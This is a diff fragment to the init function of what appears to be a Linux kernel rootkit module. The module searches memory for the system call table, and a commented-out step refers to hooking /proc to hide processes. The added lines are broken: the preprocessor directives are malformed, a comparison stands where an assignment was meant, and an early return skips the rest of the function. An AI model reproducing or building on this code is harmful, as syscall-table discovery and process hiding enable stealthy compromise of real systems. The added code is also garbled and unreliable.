@@ -354,8 +354,12 @@ static int __init r0mod_init(void)
     DEBUG("Search Start: %lx\n", SEARCH_START);
     DEBUG("Search End:   %lx\n", SEARCH_END);
 
+    if defined(_CONFIG_X86_64_)
+        sct == NULL;
+    #elif
     if((sct = (void *)find_sct()) == NULL)
         DEBUG("sct == NULL * 1\n");
+    #endif
 
     if(sct == NULL && (sct = (void *)find_sct_by_addr_scan()) == NULL)
     {
@@ -364,6 +368,8 @@ static int __init r0mod_init(void)
     }
 
     DEBUG("Search Found: sct @ %lx\n", (unsigned long)sct);
+
+    return 0;
 
     /* Hook /proc for hiding processes */
     //proc_iterate = get_vfs_iterate("/proc");
